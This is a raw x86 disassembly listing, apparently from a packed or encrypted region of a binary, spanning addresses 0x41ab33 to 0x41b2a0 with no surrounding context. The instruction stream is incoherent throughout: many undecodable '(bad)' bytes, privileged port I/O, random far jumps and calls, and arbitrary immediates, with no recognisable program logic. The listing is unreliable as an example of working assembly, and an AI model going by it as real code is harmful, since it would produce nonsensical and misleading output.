  41ab33:	stos   BYTE PTR es:[edi],al
  41ab34:	jns    0x41ab6a
  41ab36:	shr    DWORD PTR [esi+ebx*4+0x3a],1
  41ab3a:	add    DWORD PTR [esp+eax*1],ecx
  41ab3d:	mov    bh,cl
  41ab3f:	add    BYTE PTR [ebx],dl
  41ab41:	loope  0x41ab7a
  41ab43:	repz and ebx,ebx
  41ab46:	in     al,dx
  41ab47:	jbe    0x41ab62
  41ab49:	fcom   DWORD PTR [edx]
  41ab4b:	call   0x31dc40bf
  41ab50:	loope  0x41ab4e
  41ab52:	adc    al,0x5c
  41ab54:	(bad)  
  41ab55:	xlat   BYTE PTR ds:[ebx]
  41ab56:	xor    cl,BYTE PTR [ecx+ebp*8+0x24]
  41ab5a:	push   edx
  41ab5b:	shl    BYTE PTR [eax-0x1b94aa88],cl
  41ab61:	push   eax
  41ab62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab64:	xchg   esp,eax
  41ab65:	inc    edi
  41ab66:	dec    esi
  41ab67:	outs   dx,BYTE PTR ds:[esi]
  41ab68:	sti    
  41ab69:	fbld   TBYTE PTR ds:0x3a0253bc
  41ab6f:	add    DWORD PTR [ecx-0x2cdf0238],eax
  41ab75:	xor    al,0xb9
  41ab77:	sub    al,0xba
  41ab79:	ffree  st(5)
  41ab7b:	pop    ecx
  41ab7c:	call   0xb524ab5f
  41ab81:	cdq    
  41ab82:	mov    ds:0xca5dcab2,eax
  41ab87:	sub    bl,cl
  41ab89:	dec    esi
  41ab8a:	add    cl,BYTE PTR [edi-0x15b8de76]
  41ab90:	push   0x6
  41ab92:	mul    BYTE PTR [ebx+edx*4]
  41ab95:	scas   eax,DWORD PTR es:[edi]
  41ab96:	ror    DWORD PTR [ebp-0x1bd179ee],cl
  41ab9c:	test   al,0x66
  41ab9e:	ins    DWORD PTR es:[edi],dx
  41ab9f:	jmp    0x7240:0x238d0ff0
  41aba6:	mov    ebx,0x31c16ef5
  41abab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abac:	ja     0x41ab4c
  41abae:	pop    edx
  41abaf:	rcr    BYTE PTR [edx],cl
  41abb1:	jp     0x41abba
  41abb3:	pushf  
  41abb4:	push   cs
  41abb5:	repnz das 
  41abb7:	xor    cl,BYTE PTR [ebp-0x4]
  41abba:	sahf   
  41abbb:	xchg   edx,eax
  41abbc:	dec    ebx
  41abbd:	shl    DWORD PTR [edi-0x9],0x75
  41abc1:	pop    ebx
  41abc2:	cmp    cl,dh
  41abc4:	mov    esp,0xb86a35b
  41abc9:	mov    esi,0x1517787c
  41abce:	xor    eax,0x909e98e2
  41abd3:	jb     0x41abb0
  41abd5:	push   ebp
  41abd6:	imul   eax,DWORD PTR [ecx-0x110a4642],0x2ba31f6c
  41abe0:	rcr    DWORD PTR [eax+0x867f7cb],0x84
  41abe7:	nop
  41abe8:	pop    es
  41abe9:	mov    dl,BYTE PTR [eax-0x3a68243]
  41abef:	stos   DWORD PTR es:[edi],eax
  41abf0:	sbb    cl,BYTE PTR [eax+0x6e]
  41abf3:	pop    edi
  41abf4:	icebp  
  41abf5:	lds    ebp,FWORD PTR [esi+0x70]
  41abf8:	push   cs
  41abf9:	mov    al,ds:0xe3dc5c2a
  41abfe:	jle    0x41ab8a
  41ac00:	scas   eax,DWORD PTR es:[edi]
  41ac01:	add    eax,0xa87eb01d
  41ac06:	jl     0x41ab9e
  41ac08:	and    edx,DWORD PTR ds:0xe3efb1bd
  41ac0e:	jl     0x41ac62
  41ac10:	push   ss
  41ac11:	pop    eax
  41ac12:	out    0x6a,eax
  41ac14:	jecxz  0x41abea
  41ac16:	mov    ah,0x37
  41ac18:	fbstp  TBYTE PTR [esi+edi*1-0x1a]
  41ac1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac1d:	adc    DWORD PTR ds:0x267c09d2,eax
  41ac23:	inc    esi
  41ac24:	(bad)  
  41ac25:	mov    ah,0x3b
  41ac27:	and    BYTE PTR ds:[ebp+0x59e57cb3],dh
  41ac2e:	retf   0xb85d
  41ac31:	mov    bl,BYTE PTR [ebp+0xf]
  41ac34:	cmp    eax,0x25634bcb
  41ac39:	iret   
  41ac3a:	popf   
  41ac3b:	clc    
  41ac3c:	cmp    DWORD PTR [ebx-0x45ce530e],eax
  41ac42:	cmp    DWORD PTR [ecx+ecx*1+0x45a1a912],0xfd738d93
  41ac4d:	jb     0x41acb8
  41ac4f:	outs   dx,BYTE PTR ds:[esi]
  41ac50:	cmp    esi,DWORD PTR [edx+0x1256532d]
  41ac56:	in     al,dx
  41ac57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac58:	arpl   WORD PTR [ecx-0x2],bx
  41ac5b:	leave  
  41ac5c:	stos   DWORD PTR es:[edi],eax
  41ac5d:	and    DWORD PTR [ebx+edx*4-0x6e1032f2],ebx
  41ac64:	cmp    DWORD PTR [eax+0x5f828806],esi
  41ac6a:	push   eax
  41ac6b:	pop    ebx
  41ac6c:	inc    esi
  41ac6d:	lods   eax,DWORD PTR ds:[esi]
  41ac6e:	(bad)
  41ac72:	ja     0x41ac90
  41ac74:	ret    
  41ac75:	lods   eax,DWORD PTR ds:[esi]
  41ac76:	push   cs
  41ac77:	aaa    
  41ac78:	push   esp
  41ac79:	loopne 0x41ac57
  41ac7b:	jo     0x41acb4
  41ac7d:	xor    DWORD PTR [ecx+0x4a],ebp
  41ac80:	or     BYTE PTR [esp+eiz*2-0x44126956],bh
  41ac87:	outs   dx,BYTE PTR ds:[esi]
  41ac88:	jmp    0x2a73:0xe5ed0b15
  41ac8f:	mov    dl,0x79
  41ac91:	imul   esp,DWORD PTR [ebp-0x5e403fb6],0xfffffffb
  41ac98:	jne    0x41ac65
  41ac9a:	scas   al,BYTE PTR es:[edi]
  41ac9b:	repnz cdq 
  41ac9d:	push   esi
  41ac9e:	fimul  DWORD PTR [eax+0x2]
  41aca1:	pop    ss
  41aca2:	push   edi
  41aca3:	inc    esi
  41aca4:	lahf   
  41aca5:	mov    ?,WORD PTR [ecx-0x80]
  41aca8:	push   cs
  41aca9:	mov    al,0x18
  41acab:	push   cs
  41acac:	outs   dx,DWORD PTR ds:[esi]
  41acad:	push   cs
  41acae:	jg     0x41acf6
  41acb0:	call   ecx
  41acb2:	ds hlt 
  41acb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acb5:	inc    edx
  41acb6:	sub    eax,0x129e708b
  41acbb:	pop    edx
  41acbc:	jg     0x41ac43
  41acbe:	dec    edi
  41acbf:	dec    esi
  41acc0:	mov    eax,0x7eecc895
  41acc5:	mov    ah,0x2
  41acc7:	out    dx,eax
  41acc8:	or     eax,0xb94b8283
  41accd:	jle    0x41ace5
  41accf:	aaa    
  41acd0:	out    dx,eax
  41acd1:	(bad)  
  41acd2:	int    0xab
  41acd4:	test   DWORD PTR [esi+edi*1+0x4e],0x4ee4b304
  41acdc:	test   DWORD PTR [edi-0x12],ebp
  41acdf:	mov    esp,0xd2dfb220
  41ace4:	jno    0x41acc4
  41ace6:	(bad)  
  41ace8:	fs mov gs:0x8ea6bb75,al
  41acef:	sbb    ebx,edx
  41acf1:	sbb    DWORD PTR [ecx],ebx
  41acf3:	nop
  41acf4:	ins    DWORD PTR es:[edi],dx
  41acf5:	ja     0x41ad37
  41acf7:	and    al,bl
  41acf9:	add    esi,ebx
  41acfb:	or     al,0xbe
  41acfd:	sub    BYTE PTR [eax+0x7e],0x9b
  41ad01:	dec    edx
  41ad02:	xor    dl,al
  41ad04:	stos   DWORD PTR es:[edi],eax
  41ad05:	jns    0x41accf
  41ad07:	(bad)  
  41ad08:	out    dx,al
  41ad09:	not    BYTE PTR ds:0xfa8f2c12
  41ad0f:	push   cs
  41ad10:	or     ebx,DWORD PTR ds:0xde83d019
  41ad16:	jmp    0x9247768d
  41ad1b:	cli    
  41ad1c:	mov    dl,0xb8
  41ad1e:	call   0x1f5a7db4
  41ad23:	mov    ch,0xc6
  41ad25:	sub    BYTE PTR [ebp-0x80],bh
  41ad28:	and    BYTE PTR [esi-0x105e50aa],al
  41ad2e:	(bad)  
  41ad2f:	mov    ebp,0x97d5a75b
  41ad34:	jno    0x41ad46
  41ad36:	dec    esi
  41ad37:	or     DWORD PTR [edx],esi
  41ad39:	call   0xd113:0xf6bffb25
  41ad40:	pop    edx
  41ad41:	(bad)  
  41ad43:	sub    esi,DWORD PTR [eax-0x77]
  41ad46:	cmp    eax,0xe32bf63e
  41ad4b:	bound  ebx,QWORD PTR [edx+0x2e]
  41ad4e:	ins    DWORD PTR es:[edi],dx
  41ad4f:	sbb    bl,BYTE PTR [ecx-0x4659733e]
  41ad55:	out    dx,al
  41ad56:	lods   eax,DWORD PTR ds:[esi]
  41ad57:	cwde   
  41ad58:	mov    eax,ds:0x4b81a03
  41ad5d:	sbb    al,0x43
  41ad5f:	sub    al,0x43
  41ad61:	jmp    0xd296:0xcd1bb1ed
  41ad68:	mov    cl,0xed
  41ad6a:	in     al,dx
  41ad6b:	adc    BYTE PTR ds:0xfaea17e7,0x9f
  41ad72:	iret   
  41ad73:	sbb    esi,eax
  41ad75:	xor    DWORD PTR [edi-0x604281b],ecx
  41ad7b:	in     eax,0x83
  41ad7d:	inc    edi
  41ad7e:	mov    di,bp
  41ad81:	cld    
  41ad82:	jmp    0xe701434a
  41ad87:	mov    edi,0xea1f0140
  41ad8c:	pop    ebp
  41ad8d:	xchg   ebp,eax
  41ad8e:	xchg   edx,eax
  41ad8f:	mov    bl,0x2b
  41ad91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad92:	inc    eax
  41ad93:	sub    eax,0x21e27179
  41ad98:	dec    edx
  41ad99:	mov    edx,0x7ee35b57
  41ad9e:	mov    bl,0xee
  41ada0:	add    eax,0x24e3cfd3
  41ada5:	nop
  41ada6:	jmp    0x56fa:0xb5fd483b
  41adad:	and    eax,0xd187eee0
  41adb2:	jb     0x41ae18
  41adb4:	jns    0x41ad68
  41adb6:	fisubr DWORD PTR [ecx-0x28]
  41adb9:	ret    
  41adba:	cmp    cl,BYTE PTR [eax+0x1]
  41adbd:	inc    esi
  41adbe:	xlat   BYTE PTR ds:[ebx]
  41adbf:	les    edi,FWORD PTR [edx]
  41adc1:	push   es
  41adc2:	in     al,0xbb
  41adc4:	das    
  41adc5:	(bad)  
  41adc6:	sub    DWORD PTR [esi],esi
  41adc8:	mov    ecx,0x2c9250d1
  41adcd:	adc    DWORD PTR [edx-0x5a],ebx
  41add0:	cmc    
  41add1:	mov    bh,0x27
  41add3:	and    bl,BYTE PTR [ebx]
  41add5:	aam    0x92
  41add7:	pop    ebp
  41add8:	lds    edi,FWORD PTR [ebp+0x71059ec0]
  41adde:	aam    0x3c
  41ade0:	ficomp WORD PTR [esi+0x3f]
  41ade3:	inc    ecx
  41ade4:	ror    DWORD PTR [ebp+edi*4-0x4a],cl
  41ade8:	and    BYTE PTR [eax-0x430106d2],dl
  41adee:	and    edx,0x6d
  41adf1:	ss (bad) 
  41adf3:	fnstenv [edi+0x25]
  41adf6:	mov    bl,0xae
  41adf8:	or     al,0x13
  41adfa:	pop    ds
  41adfb:	sbb    BYTE PTR [esi],cl
  41adfd:	into   
  41adfe:	sub    DWORD PTR [edx],ebp
  41ae00:	push   ebx
  41ae01:	into   
  41ae02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae03:	pop    edx
  41ae04:	push   0xffffff87
  41ae06:	sar    BYTE PTR [ebx],0xe3
  41ae09:	loopne 0x41ae4d
  41ae0b:	sub    BYTE PTR [esi],dl
  41ae0d:	mov    ds:0x59adbc18,eax
  41ae12:	mov    dh,0x2d
  41ae14:	fs jl  0x41ae65
  41ae17:	(bad)  
  41ae18:	push   ecx
  41ae19:	inc    esp
  41ae1a:	xchg   ebx,eax
  41ae1b:	enter  0xde4b,0xda
  41ae1f:	shl    BYTE PTR [esi-0x311c0e2a],1
  41ae25:	aam    0x7d
  41ae27:	sbb    dh,dh
  41ae29:	das    
  41ae2a:	cmp    al,0x5a
  41ae2c:	rol    DWORD PTR [esi],0x47
  41ae2f:	lea    eax,[ebx+0x2]
  41ae32:	sti    
  41ae33:	pop    es
  41ae34:	lods   al,BYTE PTR ds:[esi]
  41ae35:	out    0x57,eax
  41ae37:	inc    edx
  41ae38:	aaa    
  41ae39:	das    
  41ae3a:	xchg   ebp,eax
  41ae3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae3c:	retf   0xc39b
  41ae3f:	and    ebx,DWORD PTR [esi+0x10]
  41ae42:	enter  0x40bb,0x51
  41ae46:	lods   eax,DWORD PTR ds:[esi]
  41ae47:	sbb    BYTE PTR [ecx+0x29],bh
  41ae4a:	iret   
  41ae4b:	inc    ecx
  41ae4c:	data16 (bad) 
  41ae4f:	icebp  
  41ae50:	lock dec esp
  41ae52:	dec    eax
  41ae53:	(bad)  
  41ae54:	pop    edx
  41ae55:	repz loope 0x41adff
  41ae58:	out    dx,al
  41ae59:	aas    
  41ae5a:	add    ah,BYTE PTR ds:0x38e0d6c1
  41ae60:	sbb    edi,DWORD PTR [ebp+0x1fb51c99]
  41ae66:	mov    ebx,0x152c64e3
  41ae6b:	(bad)  
  41ae6c:	mov    esi,0x2deeb65d
  41ae71:	mov    dh,0x54
  41ae73:	sub    DWORD PTR [ecx],ecx
  41ae75:	inc    eax
  41ae76:	lds    eax,FWORD PTR [ecx]
  41ae78:	sahf   
  41ae79:	aas    
  41ae7a:	out    dx,al
  41ae7b:	pop    esi
  41ae7c:	and    eax,0xe7204046
  41ae81:	or     eax,esi
  41ae83:	sti    
  41ae84:	inc    edx
  41ae85:	pushf  
  41ae86:	adc    cl,dl
  41ae88:	jb     0x41ae22
  41ae8a:	rcl    DWORD PTR [ebx+esi*1-0x17],0xec
  41ae8f:	dec    esi
  41ae90:	pop    edx
  41ae91:	mov    BYTE PTR [esi+0x7b0914b1],ch
  41ae97:	addr16 pop ebx
  41ae99:	int3   
  41ae9a:	adc    DWORD PTR [edx],edi
  41ae9c:	scas   al,BYTE PTR es:[edi]
  41ae9d:	outs   dx,DWORD PTR ds:[esi]
  41ae9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aea0:	and    BYTE PTR [edx],bh
  41aea2:	sbb    esi,DWORD PTR [ebx+0x7d]
  41aea5:	cdq    
  41aea6:	ins    DWORD PTR es:[edi],dx
  41aea7:	sbb    BYTE PTR [esi-0x2e2383f4],0x5
  41aeae:	iret   
  41aeaf:	test   DWORD PTR [edx+0x15],esp
  41aeb2:	jne    0x41af1e
  41aeb4:	jecxz  0x41af35
  41aeb6:	pop    ebp
  41aeb7:	outs   dx,DWORD PTR ds:[esi]
  41aeb8:	pop    edx
  41aeb9:	fs aad 0xac
  41aebc:	mov    BYTE PTR [edx+edx*1],ch
  41aebf:	xor    edx,DWORD PTR [eax]
  41aec1:	sub    esp,DWORD PTR [ebx+eiz*4]
  41aec4:	adc    cl,al
  41aec6:	pop    eax
  41aec7:	aam    0x87
  41aec9:	fwait
  41aeca:	sbb    edx,DWORD PTR [esi-0x50]
  41aecd:	pop    esp
  41aece:	jle    0x41af13
  41aed0:	pop    es
  41aed1:	(bad)  
  41aed2:	aaa    
  41aed3:	add    al,0xce
  41aed5:	test   eax,0x77183745
  41aeda:	popf   
  41aedb:	loop   0x41ae73
  41aedd:	and    BYTE PTR [ebp-0x75],bh
  41aee0:	pop    edx
  41aee1:	push   es
  41aee2:	mov    dl,0xd0
  41aee4:	sbb    eax,0x72682b20
  41aee9:	add    BYTE PTR [edi-0x6194af75],bl
  41aeef:	mov    esp,0x41ba74d3
  41aef4:	inc    esi
  41aef5:	and    DWORD PTR [edx],edx
  41aef7:	mov    ecx,?
  41aef9:	test   al,0x49
  41aefb:	aas    
  41aefc:	cli    
  41aefd:	rol    DWORD PTR [ebx],cl
  41aeff:	lea    eax,cs:[edi]
  41af02:	(bad)  
  41af03:	aam    0xdd
  41af05:	sub    ch,BYTE PTR [edi+0x41]
  41af08:	inc    ecx
  41af09:	mov    cl,0x8
  41af0b:	retf   0xa1ab
  41af0e:	shr    DWORD PTR [eax+ebp*2-0x75],0xb8
  41af13:	lods   al,BYTE PTR ds:[esi]
  41af14:	add    esi,ebp
  41af16:	mov    ebp,0xfee55cf3
  41af1b:	fcomp  DWORD PTR [eax+0x13dd999f]
  41af21:	inc    ebp
  41af22:	std    
  41af23:	shr    BYTE PTR [edi*2+0x655e149e],0x75
  41af2b:	jb     0x41aeb7
  41af2d:	loopne 0x41aee0
  41af2f:	aas    
  41af30:	jl     0x41af81
  41af32:	aad    0x75
  41af34:	loope  0x41af73
  41af36:	adc    ebp,DWORD PTR ds:0xa014ec94
  41af3c:	jae    0x41af8b
  41af3e:	sar    bl,cl
  41af40:	mov    al,ds:0x90e9fc7e
  41af45:	nop
  41af46:	popf   
  41af47:	xchg   edx,eax
  41af48:	add    edi,DWORD PTR [ebx+0x57]
  41af4b:	jl     0x41aeff
  41af4d:	add    DWORD PTR [edi-0x1f],ecx
  41af50:	outs   dx,BYTE PTR ds:[esi]
  41af51:	dec    ebp
  41af52:	xor    DWORD PTR [edi+0x30094ba5],ecx
  41af58:	or     BYTE PTR [ebx+0x30d27d7b],0xea
  41af5f:	ss inc edi
  41af61:	scas   eax,DWORD PTR es:[edi]
  41af62:	fcomp  DWORD PTR [eax]
  41af64:	pop    ss
  41af65:	call   0x7e43:0x2702ea9b
  41af6c:	sbb    BYTE PTR [ebp-0x4d536612],bh
  41af72:	out    0xd3,eax
  41af74:	ins    DWORD PTR es:[edi],dx
  41af75:	inc    ecx
  41af76:	xchg   edi,eax
  41af77:	int    0x6c
  41af79:	pop    ebp
  41af7a:	sub    eax,0xfdbd18a6
  41af7f:	adc    al,0x49
  41af81:	scas   al,BYTE PTR es:[edi]
  41af82:	push   eax
  41af83:	add    DWORD PTR [edi+0x1b],edx
  41af86:	stc    
  41af87:	push   eax
  41af88:	prefetchwt1 (bad)
  41af89:	or     eax,0x404230d6
  41af8e:	fld    DWORD PTR [ecx]
  41af90:	ss ret 0xc7e8
  41af94:	sbb    esi,DWORD PTR [edx]
  41af96:	aas    
  41af97:	mov    dh,0xcd
  41af99:	cmp    eax,0x7d34d911
  41af9e:	ins    BYTE PTR es:[edi],dx
  41af9f:	jp     0x41af8f
  41afa1:	aam    0x5b
  41afa3:	ins    DWORD PTR es:[edi],dx
  41afa4:	inc    ebx
  41afa5:	jbe    0x41affe
  41afa7:	(bad)  
  41afa8:	fisubr DWORD PTR [eax-0x2c000d0c]
  41afae:	fimul  DWORD PTR [eax+0x24b39a5b]
  41afb4:	lods   eax,DWORD PTR ds:[esi]
  41afb5:	push   ecx
  41afb6:	mov    bx,0x83ce
  41afba:	daa    
  41afbb:	in     al,dx
  41afbc:	sti    
  41afbd:	fistp  DWORD PTR [ecx]
  41afbf:	dec    edi
  41afc0:	outs   dx,DWORD PTR ds:[esi]
  41afc1:	outs   dx,DWORD PTR ds:[esi]
  41afc2:	jnp    0x41b017
  41afc4:	cmp    al,BYTE PTR [ecx]
  41afc6:	push   ecx
  41afc7:	lock add al,0x31
  41afca:	xor    eax,0xe21900b1
  41afcf:	int    0x4
  41afd1:	xchg   esi,eax
  41afd2:	out    0xe9,al
  41afd4:	test   al,0xe3
  41afd6:	ficomp WORD PTR [edx-0x29]
  41afd9:	lahf   
  41afda:	and    BYTE PTR [ecx-0x4b958b94],ch
  41afe0:	lock loop 0x41b00b
  41afe3:	mov    al,0xfd
  41afe5:	lock and DWORD PTR [edi-0x6f],edx
  41afe9:	scas   al,BYTE PTR es:[edi]
  41afea:	in     eax,0xc1
  41afec:	ficom  WORD PTR [esi-0x4763fddd]
  41aff2:	jge    0x41b019
  41aff4:	cmp    al,0xdc
  41aff6:	mov    al,ds:0xb0fe57c8
  41affb:	xchg   edx,eax
  41affc:	mov    edi,DWORD PTR [ecx+0x3d]
  41afff:	out    dx,eax
  41b000:	data16 stos BYTE PTR es:[edi],al
  41b002:	sahf   
  41b003:	pop    edi
  41b004:	fs push es
  41b006:	rol    DWORD PTR [edx+ebx*8+0x7439e418],0xb6
  41b00e:	or     al,ch
  41b010:	mov    ebp,0x36eab5b1
  41b015:	xor    al,0x38
  41b017:	or     dl,bh
  41b019:	mov    DWORD PTR [edx+eiz*2+0x50db97fc],edx
  41b020:	fsub   QWORD PTR [esi]
  41b022:	daa    
  41b023:	jle    0x41b014
  41b025:	enter  0xe615,0x6f
  41b029:	sbb    BYTE PTR ds:0xb1f4062b,ch
  41b02f:	scas   al,BYTE PTR es:[edi]
  41b030:	aam    0x75
  41b032:	aad    0xf8
  41b034:	fdiv   DWORD PTR [ebp+0x76384d49]
  41b03a:	(bad)  
  41b03b:	sub    cl,BYTE PTR [edx]
  41b03d:	outs   dx,BYTE PTR ds:[esi]
  41b03e:	int    0x35
  41b040:	jecxz  0x41b09e
  41b042:	sbb    ebx,DWORD PTR [edx]
  41b044:	mov    ebx,0xb78e886
  41b049:	inc    ebp
  41b04a:	adc    DWORD PTR [edx+0x5b1e4854],edi
  41b050:	xchg   esp,eax
  41b051:	in     al,0x66
  41b053:	sub    DWORD PTR [ecx-0x496a7a24],0xfffffff8
  41b05a:	add    eax,DWORD PTR [ebp-0x79]
  41b05d:	sar    DWORD PTR [edx+ebp*1+0x49b8f983],1
  41b064:	pusha  
  41b065:	aas    
  41b066:	lock push ebx
  41b068:	add    BYTE PTR [eax-0x1da50bc9],ah
  41b06e:	call   0xc6a9:0x97a048cc
  41b075:	stos   DWORD PTR es:[edi],eax
  41b076:	aad    0xd5
  41b078:	inc    eax
  41b079:	sbb    eax,0xf5aeef1a
  41b07e:	adc    BYTE PTR [ecx+0x23],ch
  41b081:	jo     0x41b010
  41b083:	add    al,0x1d
  41b085:	sar    BYTE PTR [edi+0x73],1
  41b088:	push   ebx
  41b089:	(bad)  
  41b08a:	xor    eax,0x959411f4
  41b08f:	neg    BYTE PTR [ebx+0x4358e5d1]
  41b095:	jle    0x41b0bc
  41b097:	jno    0x41b05a
  41b099:	push   0xffffff9d
  41b09b:	inc    ecx
  41b09c:	mov    eax,0xde46c8c9
  41b0a1:	fcmove st,st(6)
  41b0a3:	popf   
  41b0a4:	fist   DWORD PTR [eax-0x5ec15c97]
  41b0aa:	cdq    
  41b0ab:	popa   
  41b0ac:	clc    
  41b0ad:	add    esi,ecx
  41b0af:	xchg   edx,eax
  41b0b0:	mov    bl,al
  41b0b2:	and    DWORD PTR [ebx+0x1c512663],0x6c006db0
  41b0bc:	popa   
  41b0bd:	fldenv [edi+0x47e751c7]
  41b0c3:	sub    DWORD PTR [ecx],ebp
  41b0c5:	out    dx,eax
  41b0c6:	fsub   QWORD PTR [ecx+0x5b707591]
  41b0cc:	mov    edx,0x9b2ceef7
  41b0d1:	cld    
  41b0d2:	pop    edx
  41b0d3:	inc    edx
  41b0d4:	xchg   edi,eax
  41b0d5:	cmp    ah,BYTE PTR [ebx]
  41b0d7:	inc    edi
  41b0d8:	dec    edi
  41b0d9:	sub    al,dl
  41b0db:	mov    eax,fs
  41b0dd:	pop    ebp
  41b0de:	jl     0x41b10a
  41b0e0:	push   ds
  41b0e1:	data16 cs loopne 0x41b0cd
  41b0e5:	addr16 sbb eax,0x47176530
  41b0eb:	lock data16 mov bh,0x82
  41b0ef:	(bad)  
  41b0f0:	aam    0x96
  41b0f2:	scas   al,BYTE PTR es:[edi]
  41b0f3:	ficomp WORD PTR [ebp+0x35]
  41b0f6:	inc    edx
  41b0f7:	jle    0x41b150
  41b0f9:	fisttp DWORD PTR [eax-0x2298c30f]
  41b0ff:	push   eax
  41b100:	imul   esp,esi,0x7f4e4fc5
  41b106:	aas    
  41b107:	cmc    
  41b108:	xchg   esi,eax
  41b109:	mov    ah,0x36
  41b10b:	adc    eax,0x269f615f
  41b110:	sbb    BYTE PTR [ebx+0x2712e001],ch
  41b116:	jmp    0x1967127a
  41b11b:	sbb    edx,0x2a
  41b11e:	cmp    ah,BYTE PTR [eax+0x36]
  41b121:	add    eax,0x3aefd9ae
  41b126:	inc    edi
  41b127:	mov    ah,BYTE PTR [ebx+0x36]
  41b12a:	test   al,0x7c
  41b12c:	add    eax,esi
  41b12e:	sar    BYTE PTR [edx],cl
  41b130:	out    0x79,al
  41b132:	sub    BYTE PTR [eax+0x38ab45e1],ah
  41b138:	repz lds eax,FWORD PTR [ebx+0x77]
  41b13c:	ins    DWORD PTR es:[edi],dx
  41b13d:	cmc    
  41b13e:	in     al,dx
  41b13f:	jmp    0x6710:0x2b30f001
  41b146:	retf   0xd1f4
  41b149:	cmp    eax,0x5c4ab251
  41b14e:	mov    ebx,0x9f63a9a8
  41b153:	adc    edi,DWORD PTR [ebp-0x75ad4067]
  41b159:	mov    ds:0x74df9401,eax
  41b15e:	loop   0x41b1c4
  41b160:	pop    ebx
  41b161:	out    dx,eax
  41b162:	test   eax,0x165612c3
  41b167:	dec    ebx
  41b168:	jae    0x41b0eb
  41b16a:	mov    ah,0x48
  41b16c:	repnz push esi
  41b16e:	stos   DWORD PTR es:[edi],eax
  41b16f:	inc    esi
  41b170:	dec    ebx
  41b171:	test   al,0xb0
  41b173:	add    al,0x8f
  41b175:	xor    DWORD PTR [edx+0x66],ebx
  41b178:	ret    0xf56a
  41b17b:	push   0x50a32d4c
  41b180:	aaa    
  41b181:	test   BYTE PTR [ebx],0x77
  41b184:	push   es
  41b185:	mov    ch,0x91
  41b187:	mov    esp,0xaff9f793
  41b18c:	push   ebp
  41b18d:	out    0xcd,al
  41b18f:	xchg   BYTE PTR [ecx+0x7f479262],dl
  41b195:	das    
  41b196:	mov    ah,0x1
  41b198:	ror    DWORD PTR [edx],cl
  41b19a:	imul   ebx,ecx,0x7a
  41b19d:	cs inc DWORD PTR es:0x46ebd820
  41b1a5:	neg    BYTE PTR [esi+esi*8+0x8]
  41b1a9:	int    0xbe
  41b1ab:	rol    BYTE PTR [ecx],1
  41b1ad:	js     0x41b160
  41b1af:	mov    esi,0x49ecd25e
  41b1b4:	loope  0x41b20b
  41b1b6:	imul   eax,DWORD PTR [ebp+0x17],0x1e43dfea
  41b1bd:	test   BYTE PTR [edx+0x47],al
  41b1c0:	add    al,0xae
  41b1c2:	icebp  
  41b1c3:	mov    ebx,0xe9c5b9c9
  41b1c8:	call   0xc2a0:0xf28461b3
  41b1cf:	inc    BYTE PTR [ebp-0x1e6686f3]
  41b1d5:	imul   ecx,esi,0x9a1106ad
  41b1db:	mov    ecx,0xb1a82222
  41b1e0:	or     cl,cl
  41b1e2:	iret   
  41b1e3:	lea    esi,[ecx-0x64]
  41b1e6:	popa   
  41b1e7:	ficomp DWORD PTR [ebx+0x57]
  41b1ea:	or     al,0x2e
  41b1ec:	push   edi
  41b1ed:	xchg   esi,eax
  41b1ee:	leave  
  41b1ef:	and    eax,0xd6fea8f6
  41b1f4:	mov    ds:0x322683b1,al
  41b1f9:	aaa    
  41b1fa:	dec    ebp
  41b1fb:	pop    ebp
  41b1fc:	cmc    
  41b1fd:	and    eax,ecx
  41b1ff:	nop
  41b200:	or     DWORD PTR [edi+0x15],edi
  41b203:	shl    DWORD PTR [edi+0x1cafeb30],0x49
  41b20a:	xlat   BYTE PTR ds:[ebx]
  41b20b:	cs cs dec esi
  41b20e:	repnz fnstcw WORD PTR [edi]
  41b211:	(bad)  
  41b212:	fidivr WORD PTR ds:0x452a58a2
  41b218:	ror    ah,0x68
  41b21b:	sbb    al,BYTE PTR [esi+0x2b6ba140]
  41b221:	inc    eax
  41b222:	std    
  41b223:	mov    ds:0xc95d02ff,eax
  41b228:	inc    ebx
  41b229:	inc    edx
  41b22a:	push   0xffffff98
  41b22c:	or     BYTE PTR [ecx+esi*2+0x15990676],0x74
  41b234:	inc    ebx
  41b235:	sub    eax,0x3e32c12
  41b23a:	leave  
  41b23b:	(bad)  
  41b23c:	fcomp  st(4)
  41b23f:	sub    edi,DWORD PTR [ebp+0x3c]
  41b242:	cmp    BYTE PTR [ebp-0x53],0xf6
  41b246:	mov    WORD PTR [esp+eax*1-0x41],ds
  41b24a:	mov    bh,0xb8
  41b24c:	pop    edi
  41b24d:	dec    ecx
  41b24e:	jno    0x41b227
  41b250:	push   ebx
  41b251:	nop
  41b252:	xor    bh,BYTE PTR [ebp+0x1b4ca93c]
  41b258:	dec    edx
  41b259:	daa    
  41b25a:	sbb    DWORD PTR [edi],ebx
  41b25c:	push   esi
  41b25d:	out    dx,al
  41b25e:	arpl   WORD PTR [ebx],ax
  41b260:	add    al,0x32
  41b262:	jl     0x41b261
  41b264:	arpl   WORD PTR [edx+0x5],sp
  41b267:	dec    edi
  41b268:	aas    
  41b269:	xchg   ecx,eax
  41b26a:	aas    
  41b26b:	dec    ecx
  41b26c:	fnstcw WORD PTR [ebx+ebx*1-0x6b832820]
  41b273:	hlt    
  41b274:	mov    eax,ds:0xd4062a79
  41b279:	sub    edx,edx
  41b27b:	in     al,dx
  41b27c:	ins    BYTE PTR es:[edi],dx
  41b27d:	sbb    esp,DWORD PTR [eax]
  41b27f:	out    dx,eax
  41b280:	in     al,0x87
  41b282:	sbb    al,0xfa
  41b284:	fnstsw WORD PTR [edi-0x5e28272a]
  41b28a:	out    dx,eax
  41b28b:	dec    ebx
  41b28c:	mov    WORD PTR [edi],cs
  41b28e:	jg     0x41b28b
  41b290:	nop
  41b291:	jns    0x41b2e6
  41b293:	mov    al,ds:0xeaf0c40
  41b298:	push   esp
  41b299:	pop    ss
  41b29a:	mul    BYTE PTR [ebx+0x109c73fc]
  41b2a0:	push   eax
